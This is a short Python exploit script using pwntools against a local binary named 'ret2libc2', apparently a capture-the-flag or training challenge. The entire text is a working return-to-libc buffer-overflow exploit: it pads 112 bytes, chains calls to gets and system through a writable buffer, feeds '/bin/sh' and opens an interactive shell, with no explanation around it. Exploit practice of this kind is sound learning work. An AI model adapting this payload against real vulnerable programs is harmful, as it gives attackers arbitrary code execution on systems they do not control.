from pwn import *

sh = process('./ret2libc2')

gets_addr = 0x08048460
system_addr = 0x08048490
buf2_addr = 0x804a080
payload = flat(
    [b'A' * 112, gets_addr, system_addr, buf2_addr, buf2_addr])
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
